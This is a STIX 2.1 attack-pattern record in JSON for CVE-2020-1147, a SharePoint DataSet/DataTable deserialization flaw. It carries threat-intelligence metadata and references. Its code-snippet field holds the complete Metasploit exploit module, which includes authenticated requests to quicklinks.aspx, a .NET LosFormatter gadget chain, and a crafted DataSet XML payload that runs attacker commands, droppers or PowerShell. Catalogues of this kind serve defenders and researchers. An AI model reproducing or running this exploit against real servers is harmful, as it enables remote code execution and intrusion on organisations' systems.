{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f6a7890-89ac-4ca0-bf88-ff53a74bc2f7",
    "created": "2024-08-14T16:52:45.844411Z",
    "modified": "2024-08-14T16:52:45.844415Z",
    "name": "SharePoint DataSet / DataTable Deserialization",
    "description": " A remotely exploitable vulnerability exists within SharePoint that can be leveraged by a remote authenticated attacker to execute code within the context of the SharePoint application service. The privileges in this execution context are determined by the account that is specified when SharePoint is installed and configured. The vulnerability is related to a failure to validate the source of XML input data, leading to an unsafe deserialization operation that can be triggered from a page that initializes either the ContactLinksSuggestionsMicroView type or a derivative of it. In a default configuration, a Domain User account is sufficient to access SharePoint and exploit this vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sharepoint_data_deserialization.rb",
            "external_id": "sharepoint_data_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-1147"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SharePoint DataSet / DataTable Deserialization',\n        'Description' => %q{\n          A remotely exploitable vulnerability exists within SharePoint that can be leveraged by a remote authenticated\n          attacker to execute code within the context of the SharePoint application service. The privileges in this\n          execution context are determined by the account that is specified when SharePoint is installed and configured.\n          The vulnerability is related to a failure to validate the source of XML input data, leading to an unsafe\n          deserialization operation that can be triggered from a page that initializes either the\n          ContactLinksSuggestionsMicroView type or a derivative of it. In a default configuration, a Domain User account\n          is sufficient to access SharePoint and exploit this vulnerability.\n        },\n        'Author' => [\n          'Steven Seeley', # detailed vulnerability write up and the DataSet gadget\n          'Soroush Dalili', # usable endpoint testing and confirmation\n          'Spencer McIntyre' # this metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-1147'],\n          ['URL', 'https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html']\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'Windows EXE Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_dropper\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_command,\n              'Space' => 7500\n            }\n          ],\n          [\n            'Windows Powershell',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_powershell\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-07-14',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        },\n        'Privileged' => true\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The base path to the SharePoint application', '/' ]),\n      OptString.new('DOMAIN', [ true, 'The domain to use for Windows authentication', 'WORKGROUP' ]),\n      OptString.new('USERNAME', [ true, 'Username to authenticate as', '' ]),\n      OptString.new('PASSWORD', [ true, 'The password to authenticate with', '' ])\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '_layouts', '15', 'quicklinks.aspx'),\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'vars_get' => {\n        'Mode' => 'Suggestion'\n      }\n    })\n\n    return CheckCode::Unknown('Failed to authenticate to the server.') if res&.code == 401\n    return CheckCode::Safe('Failed to identify that SharePoint is running.') unless res&.code == 200 && res.headers['MicrosoftSharePointTeamServices']\n\n    html = res.get_html_document\n    return CheckCode::Safe if html.xpath('//html/body/form[@action]').select do |node|\n      node['action'] =~ /quicklinks.aspx\\?Mode=Suggestion/i\n    end.empty?\n\n    CheckCode::Detected('Received the quicklinks HTML form.')\n  end\n\n  def exploit\n    case target['Type']\n    when :windows_command\n      execute_command(payload.encoded)\n    when :windows_dropper\n      cmd_target = targets.select { |target| target['Type'] == :windows_command }.first\n      execute_cmdstager({ linemax: cmd_target.opts['Space'] })\n    when :windows_powershell\n      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    serialized = Rex::Text.encode_base64(::Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :TextFormattingRunProperties,\n      formatter: :LosFormatter\n    ))\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '_layouts', '15', 'quicklinks.aspx'),\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'vars_get' => {\n        'Mode' => 'Suggestion'\n      },\n      'vars_post' => {\n        '__viewstate' => '',\n        '__SUGGESTIONSCACHE__' => Nokogiri::XML(<<-DATASET, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)\n          <DataSet>\n            <xs:schema xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" id=\"somedataset\">\n              <xs:element name=\"somedataset\" msdata:IsDataSet=\"true\" msdata:UseCurrentLocale=\"true\">\n                <xs:complexType>\n                  <xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\">\n                    <xs:element name=\"Exp_x0020_Table\">\n                      <xs:complexType>\n                        <xs:sequence>\n                          <xs:element name=\"pwn\" msdata:DataType=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" type=\"xs:anyType\" minOccurs=\"0\"/>\n                        </xs:sequence>\n                      </xs:complexType>\n                    </xs:element>\n                  </xs:choice>\n                </xs:complexType>\n              </xs:element>\n            </xs:schema>\n            <diffgr:diffgram xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\">\n              <somedataset>\n                <Exp_x0020_Table diffgr:id=\"Exp Table1\" msdata:rowOrder=\"0\" diffgr:hasChanges=\"inserted\">\n                  <pwn xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n                  <ExpandedElement/>\n                  <ProjectedProperty0>\n                      <MethodName>Deserialize</MethodName>\n                      <MethodParameters>\n                          <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">#{serialized}</anyType>\n                      </MethodParameters>\n                      <ObjectInstance xsi:type=\"LosFormatter\"></ObjectInstance>\n                  </ProjectedProperty0>\n                  </pwn>\n                </Exp_x0020_Table>\n              </somedataset>\n            </diffgr:diffgram>\n          </DataSet>\n        DATASET\n      }\n    })\n\n    unless res&.code == 200\n      fail_with(Failure::UnexpectedReply, 'Non-200 HTTP response received while trying to execute the command')\n    end\n\n    res\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-07-14",
    "x_mitre_platforms": [
        "win'"
    ]
}